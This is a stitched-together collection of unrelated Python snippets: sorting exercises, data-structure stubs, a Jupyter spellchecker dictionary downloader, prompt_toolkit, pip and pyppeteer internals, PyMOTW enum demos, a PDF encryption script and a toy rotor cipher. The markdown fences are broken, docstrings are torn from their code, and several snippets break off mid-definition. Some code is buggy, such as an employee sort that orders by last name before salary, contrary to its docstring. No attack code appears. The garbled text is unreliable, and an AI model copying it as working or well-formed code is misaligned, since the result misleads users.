if __name__ == "__main__":
    import doctest

    doctest.testmod()

def double_sort(lst):
    """this sorting algorithm sorts an array using the principle of bubble sort,
    but does it both from left to right and right to left,
    hence i decided to call it "double sort"
    :param collection: mutable ordered sequence of elements
    :return: the same collection in ascending order
    Examples:
    >>> double_sort([-1 ,-2 ,-3 ,-4 ,-5 ,-6 ,-7])
    [-7, -6, -5, -4, -3, -2, -1]
    >>> double_sort([])
    []
    >>> double_sort([-1 ,-2 ,-3 ,-4 ,-5 ,-6])
    [-6, -5, -4, -3, -2, -1]
    >>> double_sort([-3, 10, 16, -42, 29]) == sorted([-3, 10, 16, -42, 29])
    True
    """
    no_of_elements = len(lst)
    for i in range(
        0, int(((no_of_elements - 1) / 2) + 1)
    ):  # we don't need to traverse to end of list as
        for j in range(0, no_of_elements - 1):
            if (
                lst[j + 1] < lst[j]
            ):  # applying bubble sort algorithm from left to right (or forwards)
                temp = lst[j + 1]
                lst[j + 1] = lst[j]
                lst[j] = temp
            if (
                lst[no_of_elements - 1 - j] < lst[no_of_elements - 2 - j]
            ):  # applying bubble sort algorithm from right to left (or backwards)
                temp = lst[no_of_elements - 1 - j]
                lst[no_of_elements - 1 - j] = lst[no_of_elements - 2 - j]
                lst[no_of_elements - 2 - j] = temp
    return lst


if __name__ == "__main__":
    print("enter the list to be sorted")
    lst = [int(x) for x in input().split()]  # inputing elements of the list in one line
    sorted_lst = double_sort(lst)
    print("the sorted list is")
    print(sorted_lst)

class ListNode:
    def __init__(self, value, prev=None, next=None):
        self.value = value
        self.prev = prev
        self.next = next

    def insert_after(self, value):
        pass

    def insert_before(self, value):
        pass

    def delete(self):
        pass


class DoublyLinkedList:
    def __init__(self, node=None):
        self.head = node
        self.tail = node

    def add_to_head(self, value):
        pass

    def remove_from_head(self):
        pass

    def add_to_tail(self, value):
        pass

    def remove_from_tail(self):
        pass

    def move_to_front(self, node):
        pass

    def move_to_end(self, node):
        pass

    def delete(self, node):
        pass

from __future__ import print_function

import base64
import os.path

from jupyter_core.paths import jupyter_data_dir
from notebook.services.config import ConfigManager

try:
    from urllib.request import urlopen  # Py3
except ImportError:
    from urllib import urlopen  # Py2

remote_base_url = (
    "https://chromium.googlesource.com/"
    + "chromium/deps/hunspell_dictionaries/+/master"
)
local_base_url = os.path.join(
    jupyter_data_dir(), "nbextensions", "spellchecker", "typo", "dictionaries"
)

lang_code = "de_DE"

if not os.path.exists(local_base_url):
    print("creating directory {!r}".format(local_base_url))
    os.makedirs(os.path.realpath(local_base_url))

cm = ConfigManager()
for ext in ("dic", "aff"):
    dict_fname = lang_code + "." + ext
    remote_path = remote_base_url + "/" + dict_fname + "?format=TEXT"
    local_path = os.path.join(local_base_url, dict_fname)
    print("saving {!r}\n    to {!r}".format(remote_path, local_path))
    with open(local_path, "wb") as loc_file:
        base64.decode(urlopen(remote_path), loc_file)
    rel_path = "./typo/dictionaries/" + dict_fname
    cm.update("notebook", {"spellchecker": {ext + "_url": rel_path}})

cm.update("notebook", {"spellchecker": {"lang_code": lang_code}})
```

````py
General drawing methods for graphs using Bokeh.```


```py

from bokeh.io import show, output_file
from bokeh.plotting import figure
from bokeh.models import (
    GraphRenderer,
    StaticLayoutProvider,
    Circle,
    LabelSet,
    ColumnDataSource,
)


class BokehGraph:
    """Class that takes a graph and exposes drawing methods."""

    def __init__(self):
        pass  # TODO

import numpy as np


class Test1:
    not_dtype = np.dtype(float)


class Test2:
    dtype = float


np.dtype(Test1())  # E: No overload variant of "dtype" matches
np.dtype(Test2())  # E: incompatible type

np.dtype(  # E: No overload variant of "dtype" matches
    {"field1": (float, 1), "field2": (int, 3)}
)
````

````py
Dummy layout. Used when somebody creates an `Application` without specifying a
`Layout`.```


```py
from prompt_toolkit.formatted_text import HTML
from prompt_toolkit.key_binding import KeyBindings
from prompt_toolkit.key_binding.key_processor import KeyPressEvent

from .containers import Window
from .controls import FormattedTextControl
from .dimension import D
from .layout import Layout

__all__ = ["create_dummy_layout"]

E = KeyPressEvent


def create_dummy_layout() -> Layout:
    """
    Create a dummy layout for use in an 'Application' that doesn't have a
    layout specified. When ENTER is pressed, the application quits.
    """
    kb = KeyBindings()

    @kb.add("enter")
    def enter(event: E) -> None:
        event.app.exit()

    control = FormattedTextControl(
        HTML("No layout specified. Press <reverse>ENTER</reverse> to quit."),
        key_bindings=kb,
    )
    window = Window(content=control, height=D(min=1))
    return Layout(container=window, focused_element=window)
````

````py
Dummy contextvars implementation, to make prompt_toolkit work on Python 3.6.

As long as there is only one application running at a time, we don't need the
real contextvars. So, stuff like the telnet-server and so on requires 3.7.```


```py
from typing import Any, Callable, Generic, Optional, TypeVar


def copy_context() -> "Context":
    return Context()


_T = TypeVar("_T")


class Context:
    def run(self, callable: Callable[..., _T], *args: Any, **kwargs: Any) -> _T:
        return callable(*args, **kwargs)

    def copy(self) -> "Context":
        return self


class Token(Generic[_T]):
    pass


class ContextVar(Generic[_T]):
    def __init__(self, name: str, *, default: Optional[_T] = None) -> None:
        self._name = name
        self._value = default

    @property
    def name(self) -> str:
        return self._name

    def get(self, default: Optional[_T] = None) -> _T:
        result = self._value or default
        if result is None:
            raise LookupError
        return result

    def set(self, value: _T) -> Token[_T]:
        self._value = value
        return Token()

    def reset(self, token: Token[_T]) -> None:
        pass

#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import asyncio
import sys

from pyppeteer import launch

dumpio = "--dumpio" in sys.argv


async def main():
    browser = await launch(args=["--no-sandbox"], dumpio=dumpio)
    page = await browser.newPage()
    await page.evaluate('console.log("DUMPIO_TEST")')
    await page.close()
    await browser.close()


asyncio.get_event_loop().run_until_complete(main())

def duplicate_removal(arr):
    dictonary = {}
    for i in arr:
        if i in dictonary:
            dictonary[i] = dictonary[i] + 1
        else:
            dictonary[i] = 1
    return dictonary.keys()


arr = [1, 2, 2, 3, 4, 5, 5, 6, 7]

print(int(len(list(duplicate_removal(arr)))))

# a dynamic array class
class DynamicArray:
    def __init__(self, capacity=8):
        self.count = 0
        self.capacity = capacity
        self.storage = [None] * self.capacity

    # insert
    def insert(self, index, value):
        # check count exceeding capacity
        if self.count >= self.capacity:
            # TODO: Make array dynamic with resizing
            # print("ERROR: Array is full")
            self.__resize__()
            # return

        # shift everything to the right of index
        # iterate over a range from count to the index , increment in -1
        for i in range(self.count, index, -1):
            # set storage at i to the storage at i - 1
            self.storage[i] = self.storage[i - 1]
        # add value to storage at index
        self.storage[index] = value
        # increment count
        self.count += 1

    # append
    def append(self, value):
        # check count exceeding capacity
        if self.count >= self.capacity:
            # TODO: Make array dynamic with resizing
            # print("ERROR: Array is full")
            self.__resize__()
            # return
        # add value to storage at index
        self.storage[self.count] = value
        # increment count
        self.count += 1

    # resize (private) __resize__()
    def __resize__(self):
        # double the size of the array
        # set capacity to 2 * capacity
        self.capacity *= 2
        # create a new storage with the size of the capacity
        new_storage = [None] * self.capacity
        # iterate over the data in current storage
        for i in range(self.count):
            # copy over the element
            new_storage[i] = self.storage[i]
        # set the storage to the new storage (add ref)
        self.storage = new_storage

# !/bin/python3
# e-dictionary.py
# Author : Advik Singhania
# NOTE: Requires internet connection. see README.md for more information.```


```pyA Python script that gives the meaning, synonyms and antonyms of a word using PyDictionary"""

try:  # Check and import if the module for dictionary is installed or not
    from PyDictionary import PyDictionary
except ModuleNotFoundError:
    print("PyDictionary package is not installed.")
    print("Run 'pip install PyDictionary' on your terminal to install it.")
    exit()


def find_meaning(word):  # Function to find the meaning of the word
    try:
        mean = dict.meaning(word)
        mean_keys = mean.keys()
    except AttributeError:  # If the word is not in the dictionary, print error and exit
        print("Word not found in Dictionary")
        exit()

    for i in mean_keys:  # For different keys in the dict(mean), print the key
        print("(", i, ")", sep="")  # e.g.: Noun, Verb, Adjective
        # and print the data for that respective key, line by line
        for j in range(len(mean[i])):
            print("\t", j + 1, ". ", mean[i][j], sep="")
        print()


def find_synonyms(word):  # Function to find the synonyms of the word
    syn = dict.synonym(word)  # list containing the synonyms
    print("(Synonyms)\n\t", end="")
    for i in syn:
        print(i, end=", ")
    print("\n")


def find_antonyms(word):  # Function to find the antonyms of the word
    ant = dict.antonym(word)  # list containing the antonyms
    print("(Antonyms)\n\t", end="")
    for i in ant:
        print(i, end=", ")
    print("\n")


dict = PyDictionary()  # Creating an instance of the module
word = input("Enter a word: ")
print()
find_meaning(word)
find_synonyms(word)
find_antonyms(word)

#!/usr/bin/python

import sys


# The cache parameter is here for if you want to implement
# a solution that is more efficient than the naive
# recursive solution
def eating_cookies(n, cache=None):
    if n < 0:
        return 0
    elif n == 0:
        return 1
    elif n == 1:
        return 1
    else:
        return eating_cookies(n - 1) + eating_cookies(n - 2) + eating_cookies(n - 3)


if __name__ == "__main__":
    if len(sys.argv) > 1:
        num_cookies = int(sys.argv[1])
        print(
            "There are {ways} ways for Cookie Monster to eat {n} cookies.".format(
                ways=eating_cookies(num_cookies), n=num_cookies
            )
        )
    else:
        print("Usage: eating_cookies.py [num_cookies]")
````

`` pyLegacy editable installation process, i.e. `setup.py develop`. ``

```py
import logging
from typing import List, Optional, Sequence

from pip._internal.build_env import BuildEnvironment
from pip._internal.utils.logging import indent_log
from pip._internal.utils.setuptools_build import make_setuptools_develop_args
from pip._internal.utils.subprocess import call_subprocess

logger = logging.getLogger(__name__)


def install_editable(
    install_options,  # type: List[str]
    global_options,  # type: Sequence[str]
    prefix,  # type: Optional[str]
    home,  # type: Optional[str]
    use_user_site,  # type: bool
    name,  # type: str
    setup_py_path,  # type: str
    isolated,  # type: bool
    build_env,  # type: BuildEnvironment
    unpacked_source_directory,  # type: str
):
    # type: (...) -> None
    """Install a package in editable mode. Most arguments are pass-through
    to setuptools.
    """
    logger.info("Running setup.py develop for %s", name)

    args = make_setuptools_develop_args(
        setup_py_path,
        global_options=global_options,
        install_options=install_options,
        no_user_config=isolated,
        prefix=prefix,
        home=home,
        use_user_site=use_user_site,
    )

    with indent_log():
        with build_env:
            call_subprocess(args, cwd=unpacked_source_directory)

from typing import List, Any
import numpy as np

AR_i: np.ndarray[Any, np.dtype[np.int64]]
AR_f: np.ndarray[Any, np.dtype[np.float64]]
AR_m: np.ndarray[Any, np.dtype[np.timedelta64]]
AR_O: np.ndarray[Any, np.dtype[np.object_]]
AR_U: np.ndarray[Any, np.dtype[np.str_]]

np.einsum("i,i->i", AR_i, AR_m)  # E: incompatible type
np.einsum("i,i->i", AR_O, AR_O)  # E: incompatible type
np.einsum("i,i->i", AR_f, AR_f, dtype=np.int32)  # E: incompatible type
np.einsum(
    "i,i->i", AR_i, AR_i, dtype=np.timedelta64, casting="unsafe"
)  # E: No overload variant
np.einsum(
    "i,i->i", AR_i, AR_i, out=AR_U
)  # E: Value of type variable "_ArrayType" of "einsum" cannot be
np.einsum("i,i->i", AR_i, AR_i, out=AR_U, casting="unsafe")  # E: No overload variant
```

````pyElection Winners

    Given an array of the numbers of votes
    given to each of the candidates so far,
    and an integer k equal to the number of
    voters who haven't cast their vote yet,
    find the number of candidates who still
    have a chance to win the election.

    The winner of the election must secure
    strictly more votes than any other candidate.
    If two or more candidates receive the same
    (maximum) number of votes, assume there is
    no winner at all.```


```py


def electionsWinners(votes, k):
    """Find number of candidates that have chance to win election

    Args:
        votes(int): List of number of votes given to each candidate so far.
        k(int): Number of voters who haven't cast their vote yet.

    Return:
        Number of candidates that still have chance to win election

    Raises:
    """
    highest = max(votes)
    if k == 0:
        counter = votes.count(highest)
        if counter == 1:
            return 1
        return 0
    return len([vote for vote in votes if vote + k > highest])
````

````py
Use else with a loop (for or while) as no_break found.
It can replace the tasks working with an ind = False and when you hit a case you change the val of ind = True.```


```py

for i in range(5):
    print(i)
    if i == 3:
        break
else:
    print("there was no break")

from typing import List, Optional

from .key_processor import KeyPress

__all__ = ["EmacsState"]


class EmacsState:
    """
    Mutable class to hold Emacs specific state.
    """

    def __init__(self) -> None:
        # Simple macro recording. (Like Readline does.)
        # (For Emacs mode.)
        self.macro: Optional[List[KeyPress]] = []
        self.current_recording: Optional[List[KeyPress]] = None

    def reset(self) -> None:
        self.current_recording = None

    @property
    def is_recording(self) -> bool:
        "Tell whether we are recording a macro."
        return self.current_recording is not None

    def start_macro(self) -> None:
        "Start recording macro."
        self.current_recording = []

    def end_macro(self) -> None:
        "End recording macro."
        self.macro = self.current_recording
        self.current_recording = None

from email.message import EmailMessage

msg = EmailMessage()
msg["From"] = "prince@palace.ng"
msg["To"] = "Scrooge McDuck <scoorge@disney.com>"
msg.set_content(
    """\
Dear Sir.

I'm a Nigerian prince who came into some misfortune.
...```


```py
)
print(msg)

#! /usr/bin/env python3
# -*- coding: utf-8; mode: python -*-```


```py Substitue any :emojis: in the input document with its UTF-8 code.

- See https://stackoverflow.com/questions/42087466/sphinx-extension-to-use-github-markdown-emoji-in-sphinx
- Requirements: 'emoji' package, from https://github.com/carpedm20/emoji/

I use it with a small Bash script :

```bash
BUILDDIR=_build/html

for i in "$BUILDDIR"/*.html; do
    # Convert :emojis: to UTF-8 in HTML output (from GFM Markdown), see https://stackoverflow.com/questions/42087466/sphinx-extension-to-use-github-markdown-emoji-in-sphinx
    emojize.py "$i" > "$i".new   # new file
    wdiff -3 "$i" "$i".new       # print the difference
    mv -vf "$i".new "$i"         # write back to the first file
done
````

- _Date:_ 07/04/2017
- _Author:_ Lilian Besson, (C) 2017
- _Licence:_ MIT Licence (<http://lbesson.mit-license.org>)```

```py

# Python 2 compatibility if needed
from __future__ import print_function, division

import re

# Install from https://github.com/carpedm20/emoji/
# with pip install emoji
try:
    from emoji import emojize
except ImportError:
    print("Error: package not found, install 'emoji' package with 'pip install emoji'")


def match_to_emoji(m):
    """Call emoji.emojize on m)."""
    return emojize(m.group(), use_aliases=True)


def emojize_all(s):
    """Convert all emojis :aliases: of the string s to emojis in UTF-8."""
    return re.sub(r":([a-z_-]+):", match_to_emoji, s)


def main(path):
    """Handle the file given by its path."""
    with open(path, "r") as f:
        for line in f.readlines():
            print(emojize_all(line), end="")


if __name__ == "__main__":
    from sys import argv

    for arg in argv[1:]:
        main(arg)

# End of emojize.py

class Employee(object):
    def __init__(self, first_name, last_name, job):
        self.first_name = first_name
        self.last_name = last_name
        self.job = job

    def __eq__(self, other):
        if isinstance(other, self.__class__):
            same_name = (
                self.first_name == other.first_name
                and self.last_name == other.last_name
            )
            same_job = self.job == other.job
            if same_name and same_job:
                return True
        return False

    def __repr__(self):
        return "Employee(first_name={}, last_name={}, job={})".format(
            self.first_name, self.last_name, repr(self.job)
        )


class Job(object):
    def __init__(self, title, salary):
        self.title = title
        self.salary = salary

    def __str__(self):
        print(self.title)

    def __repr__(self):
        return "Job(title={}, salary={})".format(self.title, self.salary)


def sort_employees_by_salary(employee_list):
    """
    Returns a new employee list, sorted by low to high salary then last_name
    """
    employee_list.sort(key=lambda employee: (employee.last_name, employee.job.salary))
    return employee_list

from pylint.checkers import BaseChecker
from pylint.interfaces import IRawChecker


def is_line_commented(line):
    """Checks if a `# symbol that is not part of a string was found in line"""

    comment_idx = line.find(b"#")
    if comment_idx == -1:
        return False
    if comment_part_of_string(line, comment_idx):
        return is_line_commented(line[:comment_idx] + line[comment_idx + 1 :])
    return True


def comment_part_of_string(line, comment_idx):
    """checks if the symbol at comment_idx is part of a string"""

    if (
        line[:comment_idx].count(b"'") % 2 == 1
        and line[comment_idx:].count(b"'") % 2 == 1
    ) or (
        line[:comment_idx].count(b'"') % 2 == 1
        and line[comment_idx:].count(b'"') % 2 == 1
    ):
        return True
    return False


class CommentChecker(BaseChecker):
    __implements__ = IRawChecker

    name = "refactoring"
    msgs = {
        "R2044": (
            "Line with empty comment",
            "empty-comment",
            (
                "Used when a # symbol appears on a line not followed by an actual comment"
            ),
        )
    }
    options = ()
    priority = -1  # low priority

    def process_module(self, node):
        with node.stream() as stream:
            for (line_num, line) in enumerate(stream):
                line = line.rstrip()
                if line.endswith(b"#"):
                    if not is_line_commented(line[:-1]):
                        self.add_message("empty-comment", line=line_num + 1)


def register(linter):
    linter.register_checker(CommentChecker(linter))

#!/usr/bin/env python3
# -*- coding: utf-8 -*-
```

```pyEmulation Manager module."""

from pyppeteer import helper
from pyppeteer.connection import CDPSession


class EmulationManager(object):
    """EmulationManager class."""

    def __init__(self, client: CDPSession) -> None:
        """Make new emulation manager."""
        self._client = client
        self._emulatingMobile = False
        self._hasTouch = False

    async def emulateViewport(self, viewport: dict) -> bool:
        """Evaluate viewport."""
        options = dict()
        mobile = viewport.get("isMobile", False)
        options["mobile"] = mobile
        if "width" in viewport:
            options["width"] = helper.get_positive_int(viewport, "width")
        if "height" in viewport:
            options["height"] = helper.get_positive_int(viewport, "height")

        options["deviceScaleFactor"] = viewport.get("deviceScaleFactor", 1)
        if viewport.get("isLandscape"):
            options["screenOrientation"] = {"angle": 90, "type": "landscapePrimary"}
        else:
            options["screenOrientation"] = {"angle": 0, "type": "portraitPrimary"}
        hasTouch = viewport.get("hasTouch", False)

        await self._client.send("Emulation.setDeviceMetricsOverride", options)
        await self._client.send(
            "Emulation.setTouchEmulationEnabled",
            {"enabled": hasTouch, "configuration": "mobile" if mobile else "desktop"},
        )

        reloadNeeded = self._emulatingMobile != mobile or self._hasTouch != hasTouch

        self._emulatingMobile = mobile
        self._hasTouch = hasTouch
        return reloadNeeded

# $Id: en.py 4564 2006-05-21 20:44:42Z wiemann $
# Author: David Goodger <goodger@python.org>
# Copyright: This module has been placed in the public domain.

# New language mappings are welcome.  Before doing a new translation, please
# read <http://docutils.sf.net/docs/howto/i18n.html>.  Two files must be
# translated for each language: one in docutils/languages, the other in
# docutils/parsers/rst/languages.
```

````py
English-language mappings for language-dependent features of Docutils.```


```py

__docformat__ = "reStructuredText"

labels = {
    # fixed: language-dependent
    "author": "Author",
    "authors": "Authors",
    "organization": "Organization",
    "address": "Address",
    "contact": "Contact",
    "version": "Version",
    "revision": "Revision",
    "status": "Status",
    "date": "Date",
    "copyright": "Copyright",
    "dedication": "Dedication",
    "abstract": "Abstract",
    "attention": "Attention!",
    "caution": "Caution!",
    "danger": "!DANGER!",
    "error": "Error",
    "hint": "Hint",
    "important": "Important",
    "note": "Note",
    "tip": "Tip",
    "warning": "Warning",
    "contents": "Contents",
}```


```pyMapping of node class name to label text."""

bibliographic_fields = {
    # language-dependent: fixed
    "author": "author",
    "authors": "authors",
    "organization": "organization",
    "address": "address",
    "contact": "contact",
    "version": "version",
    "revision": "revision",
    "status": "status",
    "date": "date",
    "copyright": "copyright",
    "dedication": "dedication",
    "abstract": "abstract",
}```


```pyEnglish (lowcased) to canonical name mapping for bibliographic fields."""

author_separators = [";", ","]```


```pyList of separator strings for the 'Authors' bibliographic field. Tried in
order."""

from itertools import groupby


def lineEncoding(s):
    s2 = ""
    for k, g in groupby(s):
        l = len(list(g))
        if l == 1:
            s2 += k
        else:
            s2 += str(l) + k
    return s2
````

````py
Encoding string

Run-length encoding is a fast and simple method of encoding strings.
The basic idea is to represent repeated successive characters as a single count and character.
Implement run-length encoding and decoding. You can assume the string to be encoded have no digits and consists solely of alphabetic characters.
You can assume the string to be decoded is valid.

Input: 'AAAABBBCCDAA'
Output: '4A3B2C1D2A'

=========================================
Simple solution, just iterate the string and count.
    Time Complexity:    O(N)
    Space Complexity:   O(1)```


```py


############
# Solution #
############


def encoding(word):
    n = len(word)
    if n == 0:
        return ""

    letter = word[0]
    length = 1
    res = ""

    for i in range(1, n):
        if word[i] == letter:
            length += 1
        else:
            res += str(length) + letter
            letter = word[i]
            length = 1

    res += str(length) + letter

    return res


###########
# Testing #
###########

# Correct result => '4A3B2C1D2A'
print(encoding("AAAABBBCCDAA"))

from PyPDF2 import PdfFileWriter, PdfFileReader

print("[+] The file should be in same FOLDER as this script\n")

pdf_File_Name = input("Enter EXACT name of the PDF in this FOLDER: ")
pdf_File = pdf_File_Name + ".pdf"

# Reading the pdf
pdf = PdfFileReader(pdf_File)

# Object for writing the file
write_Obj = PdfFileWriter()

# Getting the number of pages and writing each page in the writer object
for i in range(pdf.getNumPages()):
    page = pdf.getPage(i)
    write_Obj.addPage(page)

# Encrypting by the password
owner_Password = input("Enter Password for OWNER: ")
user_Password = input("Enter Password for USER: ")
write_Obj.encrypt(user_pwd=user_Password, owner_pwd=owner_Password, use_128bit=True)

# Naming and creating the encrypted PDF
new_PDF_Name_Input = input("Enter new ENCRYPTED PDF name: ")
new_PDF_Name = new_PDF_Name_Input + ".pdf"
encrypted_PDF = open(new_PDF_Name, "wb")
write_Obj.write(encrypted_PDF)

import random
from item import Item


class Enemy:
    def __init__(self, room, name, items=None, health=100):
        self.room = room
        self.name = name
        self.items = [] if items is None else items
        self.gold = 20
        self.health = health
        self.attack = 3
        self.alive = True

    def take_damage(self, dmg):
        if self.alive:
            print("the " + self.name + " took " + str(dmg) + " damage")
            self.health -= dmg + random.randrange(1, 20)
            if self.health <= 0:
                print("the " + self.name + " died from the battle")
                self.alive = False

alphabets = [chr(i) for i in range(32, 126)]
gear_one = [i for i in range(len(alphabets))]
gear_two = [i for i in range(len(alphabets))]
gear_three = [i for i in range(len(alphabets))]
reflector = [i for i in reversed(range(len(alphabets)))]
code = []
gear_one_pos = gear_two_pos = gear_three_pos = 0


def rotator():
    global gear_one_pos
    global gear_two_pos
    global gear_three_pos
    i = gear_one[0]
    gear_one.append(i)
    del gear_one[0]
    gear_one_pos += 1
    if gear_one_pos % int(len(alphabets)) == 0:
        i = gear_two[0]
        gear_two.append(i)
        del gear_two[0]
        gear_two_pos += 1
        if gear_two_pos % int(len(alphabets)) == 0:
            i = gear_three[0]
            gear_three.append(i)
            del gear_three[0]
            gear_three_pos += 1


def engine(input_character):
    target = alphabets.index(input_character)
    target = gear_one[target]
    target = gear_two[target]
    target = gear_three[target]
    target = reflector[target]
    target = gear_three.index(target)
    target = gear_two.index(target)
    target = gear_one.index(target)
    code.append(alphabets[target])
    rotator()


if __name__ == "__main__":
    decode = list(input("Type your message:\n"))
    while True:
        try:
            token = int(input("Please set token:(must be only digits)\n"))
            break
        except Exception as error:
            print(error)
    for i in range(token):
        rotator()
    for j in decode:
        engine(j)
    print("\n" + "".join(code))
    print(
        f"\nYour Token is {token} please write it down.\nIf you want to decode "
        f"this message again you should input same digits as token!"
    )

import sys
from typing import List, Optional

from pip._internal.cli.main import main


def _wrapper(args: Optional[List[str]] = None) -> int:
    """Central wrapper for all old entrypoints.

    Historically pip has had several entrypoints defined. Because of issues
    arising from PATH, sys.path, multiple Pythons, their interactions, and most
    of them having a pip installed, users suffer every time an entrypoint gets
    moved.

    To alleviate this pain, and provide a mechanism for warning users and
    directing them to an appropriate place for help, we now define all of
    our old entrypoints as wrappers for the current one.
    """
    sys.stderr.write(
        "WARNING: pip is being invoked by an old script wrapper. This will "
        "fail in a future version of pip.\n"
        "Please see https://github.com/pypa/pip/issues/5599 for advice on "
        "fixing the underlying issue.\n"
        "To avoid this problem you can invoke Python with '-m pip' instead of "
        "running pip directly.\n"
    )
    return main(args)

# Converts an enumeration to a printable string.
#
def enumToString(constants, enum, elem):
    all = constants.all_values(enum)
    for e in all.keys():
        if str(elem) == str(all[e]):
            return e
    return "<unknown>"

#!/usr/bin/python
# -*- coding: utf-8 -*-

# Enum function
# yields a tuple of element and it's index
def enum(ar):
    for index in range(len(ar)):
        yield ((index, ar[index]))


# Test
case_1 = [19, 17, 20, 23, 27, 15]
for tup in list(enum(case_1)):
    print(tup)


# Enum function is a generator does not
# return any value, instead generates
# tuple as it encounters element of array

# Tuples can be appended to list
# and can be returned after iteration
# However,
# Generator is a good option

#!/usr/bin/env python3
# encoding: utf-8```









---


```py


# end_pymotw_header
import enum


class BugStatus(enum.Enum):

    new = 7
    incomplete = 6
    invalid = 5
    wont_fix = 4
    in_progress = 3
    fix_committed = 2
    fix_released = 1

    by_design = 4
    closed = 1


for status in BugStatus:
    print("{:15} = {}".format(status.name, status.value))

print("\nSame: by_design is wont_fix: ", BugStatus.by_design is BugStatus.wont_fix)
print("Same: closed is fix_released: ", BugStatus.closed is BugStatus.fix_released)

#!/usr/bin/env python3
# encoding: utf-8```









---


```py


# end_pymotw_header
import enum


class BugStatus(enum.Enum):

    new = 7
    incomplete = 6
    invalid = 5
    wont_fix = 4
    in_progress = 3
    fix_committed = 2
    fix_released = 1


actual_state = BugStatus.wont_fix
desired_state = BugStatus.fix_released

print("Equality:", actual_state == desired_state, actual_state == BugStatus.wont_fix)
print("Identity:", actual_state is desired_state, actual_state is BugStatus.wont_fix)
print("Ordered by value:")
try:
    print("\n".join("  " + s.name for s in sorted(BugStatus)))
except TypeError as err:
    print("  Cannot sort: {}".format(err))

#!/usr/bin/env python3
# encoding: utf-8```









---


```py


# end_pymotw_header
import enum


class BugStatus(enum.Enum):

    new = {
        "num": 7,
        "transitions": ["incomplete", "invalid", "wont_fix", "in_progress"],
    }
    incomplete = {"num": 6, "transitions": ["new", "wont_fix"]}
    invalid = {"num": 5, "transitions": ["new"]}
    wont_fix = {"num": 4, "transitions": ["new"]}
    in_progress = {"num": 3, "transitions": ["new", "fix_committed"]}
    fix_committed = {"num": 2, "transitions": ["in_progress", "fix_released"]}
    fix_released = {"num": 1, "transitions": ["new"]}

    def __init__(self, vals):
        self.num = vals["num"]
        self.transitions = vals["transitions"]

    def can_transition(self, new_state):
        return new_state.name in self.transitions


print("Name:", BugStatus.in_progress)
print("Value:", BugStatus.in_progress.value)
print("Custom attribute:", BugStatus.in_progress.transitions)
print("Using attribute:", BugStatus.in_progress.can_transition(BugStatus.new))

#!/usr/bin/env python3
# encoding: utf-8```









---


```py


# end_pymotw_header
import enum


class BugStatus(enum.Enum):

    new = 7
    incomplete = 6
    invalid = 5
    wont_fix = 4
    in_progress = 3
    fix_committed = 2
    fix_released = 1


print("\nMember name: {}".format(BugStatus.wont_fix.name))
print("Member value: {}".format(BugStatus.wont_fix.value))

#!/usr/bin/env python3
# encoding: utf-8```









---


```py


# end_pymotw_header
import enum


class BugStatus(enum.IntEnum):

    new = 7
    incomplete = 6
    invalid = 5
    wont_fix = 4
    in_progress = 3
    fix_committed = 2
    fix_released = 1


print("Ordered by value:")
print("\n".join("  " + s.name for s in sorted(BugStatus)))

#!/usr/bin/env python3
# encoding: utf-8```









---


```py


# end_pymotw_header
import enum


class BugStatus(enum.Enum):

    new = 7
    incomplete = 6
    invalid = 5
    wont_fix = 4
    in_progress = 3
    fix_committed = 2
    fix_released = 1


for status in BugStatus:
    print("{:15} = {}".format(status.name, status.value))

#!/usr/bin/env python3
# encoding: utf-8```









---


```py


# end_pymotw_header
import enum


BugStatus = enum.Enum(
    value="BugStatus",
    names=("fix_released fix_committed in_progress " "wont_fix invalid incomplete new"),
)

print("Member: {}".format(BugStatus.new))

print("\nAll members:")
for status in BugStatus:
    print("{:15} = {}".format(status.name, status.value))

#!/usr/bin/env python3
# encoding: utf-8```









---


```py


# end_pymotw_header
import enum


BugStatus = enum.Enum(
    value="BugStatus",
    names=[
        ("new", 7),
        ("incomplete", 6),
        ("invalid", 5),
        ("wont_fix", 4),
        ("in_progress", 3),
        ("fix_committed", 2),
        ("fix_released", 1),
    ],
)

print("All members:")
for status in BugStatus:
    print("{:15} = {}".format(status.name, status.value))

#!/usr/bin/env python3
# encoding: utf-8```









---


```py


# end_pymotw_header
import enum


class BugStatus(enum.Enum):

    new = (7, ["incomplete", "invalid", "wont_fix", "in_progress"])
    incomplete = (6, ["new", "wont_fix"])
    invalid = (5, ["new"])
    wont_fix = (4, ["new"])
    in_progress = (3, ["new", "fix_committed"])
    fix_committed = (2, ["in_progress", "fix_released"])
    fix_released = (1, ["new"])

    def __init__(self, num, transitions):
        self.num = num
        self.transitions = transitions

    def can_transition(self, new_state):
        return new_state.name in self.transitions


print("Name:", BugStatus.in_progress)
print("Value:", BugStatus.in_progress.value)
print("Custom attribute:", BugStatus.in_progress.transitions)
print("Using attribute:", BugStatus.in_progress.can_transition(BugStatus.new))

#!/usr/bin/env python3
# encoding: utf-8```









---


```py


# end_pymotw_header
import enum


@enum.unique
class BugStatus(enum.Enum):

    new = 7
    incomplete = 6
    invalid = 5
    wont_fix = 4
    in_progress = 3
    fix_committed = 2
    fix_released = 1

    # This will trigger an error with unique applied.
    by_design = 4
    closed = 1
````

````py
All of the Enums that are used throughout the chardet package.

:author: Dan Blanchard (dan.blanchard@gmail.com)```


```py


class InputState(object):
    """
    This enum represents the different states a universal detector can be in.
    """

    PURE_ASCII = 0
    ESC_ASCII = 1
    HIGH_BYTE = 2


class LanguageFilter(object):
    """
    This enum represents the different language filters we can apply to a
    ``UniversalDetector``.
    """

    CHINESE_SIMPLIFIED = 0x01
    CHINESE_TRADITIONAL = 0x02
    JAPANESE = 0x04
    KOREAN = 0x08
    NON_CJK = 0x10
    ALL = 0x1F
    CHINESE = CHINESE_SIMPLIFIED | CHINESE_TRADITIONAL
    CJK = CHINESE | JAPANESE | KOREAN


class ProbingState(object):
    """
    This enum represents the different states a prober can be in.
    """

    DETECTING = 0
    FOUND_IT = 1
    NOT_ME = 2


class MachineState(object):
    """
    This enum represents the different states a state machine can be in.
    """

    START = 0
    ERROR = 1
    ITS_ME = 2


class SequenceLikelihood(object):
    """
    This enum represents the likelihood of a character following the previous one.
    """

    NEGATIVE = 0
    UNLIKELY = 1
    LIKELY = 2
    POSITIVE = 3

    @classmethod
    def get_num_categories(cls):
        """:returns: The number of likelihood categories in the enum."""
        return 4


class CharacterCategory(object):
    """
    This enum represents the different categories language models for
    ``SingleByteCharsetProber`` put characters into.

    Anything less than CONTROL is considered a letter.
    """

    UNDEFINED = 255
    LINE_BREAK = 254
    SYMBOL = 253
    DIGIT = 252
    CONTROL = 251

from __future__ import absolute_import, unicode_literals

from virtualenv.util.six import ensure_str, ensure_text

from .convert import convert


def get_env_var(key, as_type, env):
    """Get the environment variable option.

